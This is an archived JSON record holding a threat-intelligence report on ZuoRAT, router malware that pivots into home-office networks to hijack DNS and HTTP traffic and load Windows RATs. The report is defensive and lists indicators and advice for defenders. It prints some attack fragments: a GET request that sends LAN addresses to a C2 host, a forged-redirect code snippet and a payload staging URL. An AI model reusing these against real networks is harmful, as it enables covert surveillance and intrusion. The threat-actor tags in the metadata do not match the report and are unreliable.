{
    "id": "f671ea3a-c8a0-4447-b28a-a128e961e783",
    "created_at": "2023-01-12T15:06:48.015674Z",
    "updated_at": "2025-03-27T02:14:34.072737Z",
    "deleted_at": null,
    "sha1_hash": "df62e421d07010cf3be56c5e0de4e21524fc7e77",
    "title": "2022-06-28 - ZuoRAT Hijacks SOHO Routers To Silently Stalk Networks",
    "authors": "",
    "file_creation_date": "2022-07-02T23:18:22Z",
    "file_modification_date": "2022-07-02T23:18:22Z",
    "file_size": 1368211,
    "plain_text": "# ZuoRAT Hijacks SOHO Routers to Silently Stalk Networks\n\n**[blog.lumen.com/zuorat-hijacks-soho-routers-to-silently-stalk-networks/](https://blog.lumen.com/zuorat-hijacks-soho-routers-to-silently-stalk-networks/)**\n\nJune 28, 2022\n\n[Black Lotus Labs\nPosted On June 28, 2022](https://blog.lumen.com/author/black-lotus-labs/)\n\n[0](https://blog.lumen.com/zuorat-hijacks-soho-routers-to-silently-stalk-networks/#respond)\n\n## Executive Summary\n\nThe rapid shift to remote work in spring of 2020 presented a fresh opportunity for threat\nactors to subvert traditional defense-in-depth protections by targeting the weakest points of\nthe new network perimeter — devices which are routinely purchased by consumers but\nrarely monitored or patched — small office/home office (SOHO) routers. Actors can leverage\nSOHO router access to maintain a low-detection presence on the target network and exploit\nsensitive information transiting the LAN. Black Lotus Labs, the threat intelligence arm of\nLumen Technologies, is currently tracking elements of what appears to be a sophisticated\ncampaign leveraging infected SOHO routers to target predominantly North American and\nEuropean networks of interest. We identified a multistage remote access trojan (RAT)\ndeveloped for SOHO devices that grants the actor the ability to pivot into the local network\n\n\n-----\n\nand gain access to additional systems on the LAN by hijacking network communications to\nmaintain an undetected foothold. While we currently have a narrow view of the full extent of\nthe actor’s capabilities due to the limited state of SOHO device monitoring in general, using\nproprietary telemetry from the Lumen global IP backbone, we have enumerated some of the\ncommand-and-control (C2) infrastructure associated with this activity and identified some of\nthe targets. We assess with high confidence the elements we are tracking are part of a\nbroader campaign.\n\n## Introduction\n\nFigure 1: Overview of campaign elements\n\nThe elements of the campaign we are tracking include the following:\n\nA first-stage RAT developed for SOHO routers which we dubbed ZuoRAT, based on the\nChinese word for “left” (after the actor’s file name, “asdf.a”, which suggests keyboard\nwalking of the lefthand home keys).\nA simple loader for Windows machines compiled in C++.\nThree subsequent, fully functional agents – two of which were custom-developed – that\nenabled various functions including enumerating the infected device, downloading and\nuploading files, network communication hijacking and process injection, among others.\n\n\n-----\n\nZuoRAT is a MIPS file compiled for SOHO routers that can enumerate a host and internal\nLAN, capture packets being transmitted over the infected device and perform person-in-themiddle attacks (DNS and HTTPS hijacking based on predefined rules). At present, we have\nnot been able to recover the ruleset; however, we hypothesize that the hijack module was\nthe access vector to the deployment of the subsequent shellcode loaders. Using Lumen\nglobal telemetry, we uncovered several infected routers acting as proxy C2 nodes.\n\nWhile compromising SOHO routers as an access vector to gain access to an adjacent LAN\nis not a novel technique, it has seldom been reported. Similarly, reports of person-in-themiddle style attacks, such as DNS and HTTP hijacking, are even rarer and a mark of a\ncomplex and targeted operation. The use of these two techniques congruently demonstrated\na high level of sophistication by a threat actor, indicating that this campaign was possibly\nperformed by a state-sponsored organization.\n\nThe Windows loader we analyzed reached out to obtain a remote resource and then ran it on\nthe host machine. We assess that it was used to load one of the following fully functional\nsecond-stage agents, depending on the environment:\n\nCBeacon – A custom developed RAT written in C++, which had the ability to upload\nand download files, run arbitrary commands and persist on the infected machine via a\ncomponent object model (COM) hijacking method.\nGoBeacon – A custom-developed RAT written in Go. This trojan had almost the same\nfunctionality as CBeacon, but also allowed for cross-compiling on Linux and MacOS\ndevices.\nCobalt Strike – We observed that in some cases this readily available remote access\nframework was used in lieu of either CBeacon or GoBeacon.\n\nAnalysis of multiple Windows samples revealed the consistent use of the same program\ndatabase (PDB) paths, some of which contained Chinese characters, while others\nreferenced ‘sxiancheng’, a possible name or Chinese locality. Additionally, there was a\nsecond set of actor-controlled C2 infrastructure used to interact with the Windows RATs that\nwas hosted on internet services from China-based organizations, namely Alibaba’s Yuque\nand Tencent. Given the age of the first observed router sample, which was first submitted to\nVirusTotal in December 2020, as well as a sampling from Black Lotus Labs telemetry over a\nperiod of nine months, we estimate this years-long campaign has impacted at least 80\ntargets, likely many more.\n\nThis report represents Black Lotus Labs’ understanding of the threat actor activity as of the\ndate of publication and likely does not cover the entire campaign. Black Lotus Labs will\nupdate the community with additional findings as appropriate.\n\n## Technical Details\n\n\n-----\n\n### Router Component\n\n**First Stage Router Exploitation**\n\nDuring our investigation of the ZuoRAT activity, we observed telemetry indicating infections\nstemming from numerous SOHO router manufacturers, including ASUS, Cisco, DrayTek and\nNETGEAR. However, as of the time of this writing, we have only been able to obtain the\nexploit script for JCG-Q20 model routers. In this case, the actor exploited known CVEs\n(CVE-2020-26878 and CVE-2020-26879) using a Python-compiled Windows portable\n[executable (PE) file that referenced a proof of concept called ruckus151021.py. The purpose](https://github.com/beyefendi/exploit/blob/main/ruckus151021.py)\nof the script was to gain credentials and load ZuoRAT.\n\nBased upon Shodan data, the JCG-Q20 model was only ever observed with connections to\nChinese IP addresses. Both the C2 and host IPs linked to the exploit were also located in\nChina, with potential targeting in Hong Kong. We subsequently discovered a text file\nuploaded to VirusTotal by the same submitter as the exploit script which lists numerous IP\naddresses with the designator “HK,” presumably referencing Hong Kong.\n\nWhile the actor modified the proof-of-concept exploit script for the JCG-Q20 router model,\nthe underlying logic remained the same: the script first performed command line injection to\nobtain authentication material, and then used the output from the command injection to\nperform an authentication bypass. This chain of vulnerabilities allowed the actor to download\na binary, then execute it on the host. The script we recovered contained four functions:\n\nThe final stage of the exploit script was to download the ZuoRAT agent.\n\n**ZuoRAT Router Malware Overview**\n\nThe ZuoRAT agent framework enables in-depth reconnaissance of target networks, traffic\ncollection and network communication hijacking. It can be divided into two components: the\nfirst included functions that would auto-run upon execution of the file. The second component\nwas comprised of functions that were embedded into the file but were not explicitly called.\nWe assess that these functions were intended to be called by additional commands. ZuoRAT\n[appears to be a heavily modified version of the Mirai malware.](https://github.com/jgamblin/Mirai-Source-Code)\n\n\n-----\n\n**Component 1: Core Functionality**\n\nThe first component was designed to glean information about the router and LAN, enable\npacket capture of network traffic and send the information back to the C2. We assess the\npurpose of this component was to acclimate the threat actor to the targeted router and the\nadjacent LAN to determine whether to maintain access.\n\nThe capabilities included functions to ensure only a single instance of the agent was present,\nand to perform a core dump that could yield data stored in memory such as credentials,\nrouting tables and IP tables, among other information. The file was initially executed by the\nthreat actor via the command line, specifying an IP address and port for the C2 node. If the\nIP:port was not provided in the exploit script, the ZuoRAT code contained a default C2\nhostname listed as cs.memthree[.]com, a domain that was originally purchased in October\n2020.\n\nUpon execution, the agent started a new process with a name that was a randomly\ngenerated 32-character string consisting of A-Z and 0-9. Next, it gathered host-based\ninformation by running the uname command to send to the C2. It also attempted to gather\nthe router’s public IP address by querying the following web services:\n\nhttp://whatsismyip.akamai[.]com\nhttp://ident[.]me\nhttp://myipdnsomatic[.]com\nhttp://ipecho[.]net.\n\nIf ZuoRAT was not able to obtain a public IP address, then it would delete itself. We assess\nthe purpose of this feature was to detect if it was being run in an isolated sandbox.\n\nNext, ZuoRAT would connect to the C2 and listen on port 48101. If this port was already in\nuse, it would kill the current process to ensure that only a single instance of the trojan was\nrunning on the compromised device.\n\nZuoRAT then used a scan function designed to survey the adjacent LAN’s internal IP\naddresses. Specifically, it scanned for a hardcoded list of open ports, including: 21, 22, 23,\n80, 135, 139, 443, 445, 808, 902, 912, 1723, 2323, 3306, 5222, 5269, 5280, 5357, 8080,\n8443 and 9001.\n\nNext, ZuoRAT sent the reconnaissance information to the previously supplied C2. If the\nconnection was being established for the first time, it occurred over 55556; if the connection\nwas being refreshed, communication switched over to port 39500. If the connection was\nsuccessful, data would be transmitted. If errors were returned, the program slept and\nrepeated the loop.\n\n\n-----\n\nLastly, in preparation to establish network capture capabilities, ZuoRAT allocated memory for\nincreased performance and assigned a mutually exclusive flag (mutex) to ensure only one\ninstance ran at a time. If initiated by subsequent commands, the functions below would allow\nthe actor to collect network traffic on UDP, DNS and some TCP connections where data\nmight be sent in the clear:\n\ninit_http_proto_match_rule\ninit_https_proto_match_rule\ninit_dns_proto_match_rule\ninit_ftp_proto_match_rule\ninit_socks_proto_match_rule\ninit_scan_flag\ninit_http_hij_info\ninit_dns_hij_rule_list\ninit_catch_file_match_info\ninit_ip_port_record_list\ninit_banner_record_list\ndns_plug_init\nudp_pcap_init\npcap_platform_init\nnetbroker_init\n\nA function was then initialized to collect TCP connections over the following specified ports:\n20, 21 (associated with FTP connection), 80, 8080, 443 and 8443 (associated with webbased activity). This could allow the threat actor to obtain any credential passed in the clear,\nand gain insight into the browsing activity performed by the end user behind the\ncompromised router.\n\n**Component 2: Embedded Exportable Functions**\n\nThe second component consisted of auxiliary commands sent to the router to be run at the\nactor’s discretion by additional modules that downloaded onto the infected machine, which\nwas possibly informed by the device and network information gleaned from the first\ncomponent. We observed approximately 2,500 embedded functions, which included modules\nranging from password spraying to USB enumeration and code injection. We focused on the\nLAN enumeration capability, which provided the actor additional targeting information for the\nLAN environment, and subsequent DNS and HTTP hijacking capabilities, attack styles that\nare traditionally difficult for defenders to detect.\n\n**Advanced LAN Enumeration**\n\nSeveral secondary commands supported additional LAN enumeration and the collection of\nDNS configurations from the infected system. One function would send DNS information to a\nhard-coded IP address, 202.178.11[.]78. Unfortunately, we did not observe any telemetry\n\n\n-----\n\nfrom the compromised routers communicating with this IP address, suggesting either the IP\naddress was manually reconfigured or that it was no longer being used at the time of our\nanalysis. However, it was one of three functions that contained an externally routable C2,\nsuch as an IP address or a domain.\n\nAnother function would gather host-based DNS and WiFi settings such as the basic service\nset identifier (BSSID) and service set identifier (SSID) information. Lastly, the agent would\ngather the internal IP addresses and the MAC addresses of the devices from the ARP table,\nwhich can help an actor conduct a highly detailed assessment of a LAN. A sample GET\nrequest follows:\n\n“GET /arp.php?o_addr=%s&int_ip=%s&int_mac=%s HTTP/1.1\\r\\nHost: 101.99.91.10\\\nr \\nConnection: keep-alive\\r\\nCache-Control: max-age=0\\r\\nUpgrade-Insecure-Re quests:\n1\\r\\nAccept-Encoding: gzip, deflate\\r\\nAccept-Language: zh-CN,zh;q=0 .9\\r\\n\\r\\n”\n\n**DNS Hijacking**\n\nOnce the threat actor obtained information about the DNS settings and the internal host in\nthe adjacent LAN, there were several functions designed to perform DNS hijacking. These\nfunctions would look at the DNS requests that were being transmitted through the router and\na custom DNS parser, providing statistics on the types of domains being requested by the\nvictim. Other functions allowed the actor to update DNS hijacking rules specifying which\ndomains to hijack, the malicious IP address resulting from the hijack and the number of times\nto trigger the rule. It would also capture the time at which the new rule was created and its\ntask number, then flag it if the rule was active. In an older sample from 2020, a partial list of\ndomains and IP addresses were hard-coded, and they included publicly routable and internal\nIP addresses:\n\n91.196.70[.]49\n077d.kse[.]com\n192.168.100[.]30\n202.178.11[.]78\nwww.baidu[.]com\n172.230.88[.]99\n2001[:]:A12C\n2001[::]A12D\nwww.sina[.]com\n\n**HTTP Hijacking**\n\n**HTTP Hijacking**\n\n\n-----\n\nAnother noteworthy function enabled the actor to specify which client or subnet to hijack. The\nmain purpose of wp_init was to redirect a TCP-based connection that transited the device. It\nhijacked the process so that it could match the traffic pattern, which consisted of parameters\nfor the following fields:\n\nSource IP\nSource Port\nDestination IP\nDestination Port\nProtocol\nURL\n\nThis information was generated and stored in the “tmp/wp” and “tmp/wp/log” directories. By\nstoring this information in temporary directories, the file was deleted if the machine was\npower-cycled, making recovery of these rulesets established by the actor elusive. If a rule\nwas triggered, it displayed a 302 error that redirected the client’s browser to another location\nwhere the threat actor could manipulate the connection.\n\n.pic.printf(“xz_send_http_packet_tcp………………………,location url %s\\n”,location_url);\n\n.pic.snprintf(buf,0x400,\n\n“HTTP/1.1 302 Moved Temporarily\\r\\nServer: JSP2/1.0.2\\r\\nLocation: %s\\r\\n\\r\\n”,\n\nlocation_url);\n\n**Persistence and Agent Maintenance**\n\nShould a network be deemed a high priority for targeting, the actor could use several\nfunctions to establish persistence and perform ongoing router agent maintenance.\n\nOne function enabled the actor to run ZuoRAT as a daemon. Another would restart the router\nto remove ZuoRAT and any trace of exploitation from memory. A third function included the\nability to delete the ELF file and then obtain a new version from the C2.\n\n### Black Lotus Labs Telemetry on the Router Intrusion\n\nBlack Lotus Labs visibility indicates ZuoRAT and the correlated activity represent a highly\ntargeted campaign against U.S. and Western European organizations that blends in with\ntypical internet traffic through obfuscated, multistage C2 infrastructure, likely aligned with\nmultiple phases of the malware infection. The extent to which the actors take pains to hide\nthe C2 infrastructure cannot be overstated. First, to avoid suspicion, they handed off the\ninitial exploit from a dedicated virtual private server (VPS) that hosted benign content. Next,\n\n\n-----\n\nthey leveraged routers as proxy C2s that hid in plain sight through router-to-router\ncommunication to further avoid detection. And finally, they rotated proxy routers periodically\nto avoid detection.\n\n**Identifying Devices Communicating with the Staging Server**\n\nOne sample compiled in December 2021 was hosted on the following URL:\nhttp://141.98.212[.]62/asdfa.a. Our telemetry indicates that the C2 first became active in early\nSeptember 2021 and was used with at least six waves of exploitation through October 2021.\nLikely to make the staging server appear more legitimate, the threat actor uploaded some\ncontent written in Arabic script on the hard-coded IP address’s default page. We did not find\nany subsequent malicious activity associated with the webpage and suspect it was uploaded\nas a ruse to avert suspicion. This type of action is a TTP of a highly sophisticated actor to\nevade detection.\n\nFigure 2: Screenshot of the content hosted on the default landing page for the C2\n\nBased upon our telemetry, we observed only 23 devices with a persistent connection to this\nC2 from September through October 2021. All 23 devices were located in the U.S. and\nCanada. The majority of IP addresses communicated with the C2 over TCP port 9000, but a\nfew communicated over other ports, including 55556, 55558 and 39500. The device types\nconsisted of, but were not limited to: Cisco RV 320, 325 and 420; Asus RT-AC68U, RTAC530, RT-AC68P and RT-AC1900U; DrayTek Vigor 3900 and unspecified NETGEAR\ndevices. Based upon our analysis of the router malware and our telemetry, the trojan\nattempted to establish a TCP connection over port 55556 and, as noted above, the refresh\n\n\n-----\n\nsocket connected over port 39500. We were unable to correlate the activity that occurred\nover port 55558, so we suspect this port was manually passed to the trojan. While we did not\nobserve this in our telemetry, there was also a function that created a socket connection on\nport 55555.\n\nWe have since seen subsequent activity from a separate C2 103.140.187[.]131:6666\noccurring from Feb. 22, 2022 – May 16, 2022, which we assess was acting in a similar\nmanner.\n\n**Compromised Devices Acting as Proxy C2s**\n\nBased on a list of devices that communicated with the C2 hosting the ZuoRAT trojan, we\nused Black Lotus Labs global telemetry to further identify several bots, or victim routers, that\ncommunicated with multiple compromised devices acting as proxy C2s.\n\nFor example, we observed persistent connection from one bot to another router in Taiwan (IP\naddress 59.124.6.x) which our analysis revealed as a Vigor DrayTek router. In this\ninteraction, the Taiwanese IP acted like a server and the other router acted like a bot, where\nthe IP would connect from an ephemeral port and the destination port and IP address\nremained consistent over the course of several weeks. We assess with moderate confidence\nthat this device was compromised and repurposed by the threat actor as a proxy to\nobfuscate the threat actor’s true IP address.\n\nThis proxy node was active from at least Sept. 28 through Dec. 21, 2021. Beginning around\nDec. 13, however, the compromised devices located in North America that were previously\ninteracting with the Taiwanese IP began to transit to another router with the IP address\n142.68.171.x, located in Canada. This suggests that the threat actor rotates proxy routers to\nhamper detection efforts.\n\n\n-----\n\nFigure 3: Diagram of proxy C2 communications shift observed through Black Lotus Labs\ntelemetry\n\nBased on internal network telemetry analytics, Black Lotus Labs discovered other IPs that\nexhibited the same communication patterns. We therefore associate those nodes with\nmoderate confidence to this activity set. Additionally, the proxy routers we have enumerated\nso far are located in a different country than the other bots to which they are connected.\n\nFigure 4: Heatmap of bots observed through Black Lotus Labs telemetry\n\n### Core Windows Shellcode Loader\n\nOnce we identified the ZuoRAT router sample, we began to look for the next stage of the\nattack. Based upon correlations within environment variables such as the PDB paths and\nMAC addresses found within both samples, along with common VirusTotal submitter IDs, we\nassess that it is likely ZuoRAT is correlated to the Windows loader that would enable the\nactor to pivot from the compromised router to a Windows device on the adjacent LAN. The\nloader file was written in C++ and used to load a more robust RAT onto the infected\nworkstation. The shellcode loader exhibited an interesting evasion technique: it\nmasqueraded as a legitimate program by using a real Tencent certificate, a technique\n[previously outlined by SpectorOps. While the binary certificate showed as being invalid in](https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf)\nthis case, this technique lowered the detection rate. When one of the loader files had the\n\n\n-----\n\nfraudulent certificate appended to it, the initial detection rate was 6/66; but when a very\nsimilar sample without the fraudulent certificate was analyzed the following day, the detection\nrate was 9/66.\n\nFigure 5: Image of the invalid certificate appended to the malicious program\n\nThe shellcode loader allocated space in memory and reached out to an embedded C2.\nInterestingly, the loader used a hard-coded Mac user-agent string, despite the samples\nthemselves being compiled for Windows machines:\n\nMozilla/5.0 (Macintosh Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko)\nChrome/79.0.3945.88 Safari/537.36\n\nThe sample then reached out to the embedded C2 to obtain the shellcode to run it. If the C2\nwas unreachable, the sample would sleep and then repeat the loop. In early September\n2021, we observed that the shellcode was placed on a hard-coded IP address, such as\nhttp[:]//1.15.122[.]211/index2.html. We observed the shellcode on an embedded URL hosted\n\n\n-----\n\non [Yuque, which is owned by Alibaba and describes itself as a cloud-based knowledge](https://www.yuque.com/?language=en-us)\nbase” for “personal notetaking, knowledge creation, group collaboration, and knowledge\nmanagement.”\n\nThis file executed the shellcode serving as the core agent. Thus far, we have associated\nthree core agents to this activity cluster: the CBeacon custom agent, the GoBeacon custom\nagent and Cobalt Strike.\n\n**CBeacon – Custom Agent**\n\nCBeacon is a fully functional, custom-developed RAT with a low detection rate that allows an\nactor to persist on an infected workstation and exhibits ties to the Windows loader file. The\nagent is written in C++.\n\nWe found three iterations of CBeacon. The earliest version did not contain a C2 channel; the\nsecond variant contained a C2 channel but did not implement all the functions; and the last\nvariant implemented 7/8 of the pre-built functions and contained a C2 channel. In the two\nvariants that had an external communications channel, the agent used a custom Base64\nalphabet (9aB-ZAb-z0-8+/=) in addition to the user-agent string of WinHTTP.\n\nFigure 6: Screenshot of the network traffic generated by CBeacon when run in the Black\nLotus Labs lab environment\n\nCBeacon contained eight pre-built functions that, when called, were referenced as listed\nbelow:\n\n\n-----\n\nOne function, referenced in the code as UBCmdAutoActivist, displayed a highly sophisticated\npersistence technique leveraging two embedded DLLs. The first DLL copied the original\nCBeacon file to the APPData directory and renamed it OneDriverUpdaterService.exe then\nhijacked the “InprocServer32 component object model (COM)” as described in web forums in\n[2018 and](https://www.cyberbit.com/endpoint-security/com-hijacking-windows-overlooked-security-vulnerability/) [2020. The program then overwrote the DLL host to enable execution upon](https://pentestlab.blog/2020/05/20/persistence-com-hijacking/)\nWindows startup. (The pop-up window it opened indicates the functionality was copied from\na [PoC.)](https://github.com/SolomonSklash/COM-Hijacking)\n\nThe second DLL created a remote thread to inject into the explorer.exe process before\nloading the first DLL, then second DLL executed the first DLL via the command line.\nDepending on the number of command line arguments, the second DLL would either take\nthe command line argument as a filename and delete itself or run without executing the\nUBCmdAutoActivist function.\n\nLastly, CBeacon created a thread to call a heartbeat function that reached out every five\nseconds to the C2 with information listed in the table above. In one sample, the C2 was\nlocated at https://service-1onwbsn4-1253943544.gz.apigw.tencentcs[.]com.\n\n**GoBeacon – Go-based Variant of CBeacon**\n\nThe second core agent was a variation of the CBeacon agent compiled in Go, which enables\ncross-platform functionality. While we have not analyzed specific Mac or Linux samples, we\nassess the intent was to allow the actor to use the CBeacon functionality in environments\nother than Windows. When we ran the first GoBeacon sample in our lab environment, we\n\n\n-----\n\nnoticed that the first sample encoded the data with the same custom Base64 (9aB-ZAb-z08+/=) character set as CBeacon. This sample contained a private IP address and appeared\nto still be in development, as it wrote its logs to the console.\n\nFigure 7: Screenshot of the Go agent network traffic\n\nWhen we compared the fields gathered by the C2.heartbeat commands in CBeacon versus\nGoBeacon, they were almost identical except the Go variant added one new field: process ID\n(PID).\n\nFigure 8: Images comparing the information when C2.Heartbeat was run on CBeacon versus\nGoBeacon\n\nBoth samples utilized similar logic to inject shellcode from a remote server into Internet\nExplorer via iexplorer.exe and created a socket to a remote server, which in both cases was\na private IP address.\n\n**Cobalt Strike**\n\n\n-----\n\nIn addition to CBeacon and GoBeacon, Black Lotus Labs observed a Cobalt Strike sample\nrelated to this activity cluster. This sample was compiled on April 8, 2022, and communicated\nwith a hard-coded IP address, 110.42.185[.]232:8081/kGZQ, which is associated with\nTencent cloud. This sample was correlated to the known activity cluster due to the\ncommonalities found in its PDB path.\n\n**Cobalt Strike PDB path:**\n\nD:\\c-code\\c++\\shellcode\\sxianchengcopy–kehu\\x64\\Release\\sc2.pdb\n\n**One of the Windows shellcode loader PDB paths:**\n\nD:\\c-code\\c++\\shellcode\\sxianchengcopy\\Release\\sc2.pdb\n\n### Workstation C2 Infrastructure: File Sharing Platforms and Redirectors\n\nOne unique aspect of this campaign was the use of China-based third-party infrastructure,\nsuch as Yuque and Tencent. While the tactic of using third-party infrastructure such as a file\nsharing platform is not new, there has been very little reporting on the use of the Alibaba’s\nYuque platform for covert command and control infrastructure. Another notable aspect was\nthe use of the Tencent platform as a redirector for command and control. Prior reporting on\n[this topic has been published by various red teamers who explored using Cloudflare workers](https://ajpc500.github.io/c2/Using-CloudFlare-Workers-as-Redirectors/)\nas redirectors to protect upstream VPSs. While the underlying concepts remain the same,\nthis threat actor chose to use the Tencent platform to receive or potentially redirect the\nrequests. We suspect this technique was used to evade network-based detection\nmechanisms.\n\n## Conclusion\n\nThough advanced actors have long demonstrated the capability and intent to target sensitive\nnetworks, the industry has uncovered only a handful of router-based malware specifically\ndesigned to covertly target them. The sudden shift to remote work spurred by the pandemic\nallowed a sophisticated adversary to seize this opportunity to subvert the traditional defensein-depth posture of many well-established organizations. The capabilities demonstrated in\nthis campaign – gaining access to SOHO devices of different makes and models, collecting\nhost and LAN information to inform targeting, sampling and hijacking network\ncommunications to gain potentially persistent access to in-land devices and intentionally\nstealth C2 infrastructure leveraging multistage siloed router to router communications –\npoints to a highly sophisticated actor that we hypothesize has been living undetected on the\nedge of targeted networks for years.\n\nBlack Lotus Labs has added the IoCs from this campaign into the threat intelligence feed that\nfuels the Lumen Connected Security portfolio, and we continue to monitor for new\ninfrastructure, targeting activity and expanding TTPs. We will continue to collaborate with the\n\n\n-----\n\nsecurity research community to share findings related to this activity and ensure the public is\ninformed. We encourage the community to monitor for and alert on these and any similar\nIoCs. We also advise the following:\n\nNetwork defenders: Use IoCs outlined in this report to monitor for the Windows loader\nand its modules, as well as connections to any suspicious infrastructure.\nConsumers with SOHO routers: Users should follow best practices of regularly\nrebooting routers and installing security updates and patches. Users should leverage\nproperly configured and updated EDR solutions on hosts and regularly update software\nconsistent with vendor patches where applicable.\nWe recommend that businesses consider comprehensive Secure Access Service Edge\n(SASE) or similar solutions to bolster their security posture and enable robust detection\non network-based communications.\n\n[For additional IoCs associated with this campaign, please visit our GitHub page.](https://github.com/blacklotuslabs/IOCs/blob/main/ZuoRAT_IoCs.txt)\n\nIf you would like to collaborate on similar research, please contact us on Twitter\n@BlackLotusLabs.\n\nThis analysis was performed by Danny Adamitis and Steve Rudd. Technical editing by\nStephanie Walkenshaw.\n\nThis information is provided “as is” without any warranty or condition of any kind, either\nexpress or implied. Use of this information is at the end user’s own risk.\n\nServices not available everywhere. ©2022 Lumen Technologies. All Rights Reserved.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-06-28 - ZuoRAT Hijacks SOHO Routers To Silently Stalk Networks.pdf"
    ],
    "report_names": [
        "2022-06-28 - ZuoRAT Hijacks SOHO Routers To Silently Stalk Networks.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
            "created_at": "2023-01-06T13:46:38.376868Z",
            "updated_at": "2025-03-27T02:00:02.818071Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Cobalt Gypsy",
                "G0003",
                "Operation Cleaver",
                "Op Cleaver",
                "Tarh Andishan",
                "Alibaba",
                "TG-2889"
            ],
            "source_name": "MISPGALAXY:Cleaver",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536008,
    "ts_updated_at": 1743041674,
    "ts_creation_date": 1656803902,
    "ts_modification_date": 1656803902,
    "files": {
        "pdf": "https://archive.orkl.eu/df62e421d07010cf3be56c5e0de4e21524fc7e77.pdf",
        "text": "https://archive.orkl.eu/df62e421d07010cf3be56c5e0de4e21524fc7e77.txt",
        "img": "https://archive.orkl.eu/df62e421d07010cf3be56c5e0de4e21524fc7e77.jpg"
    }
}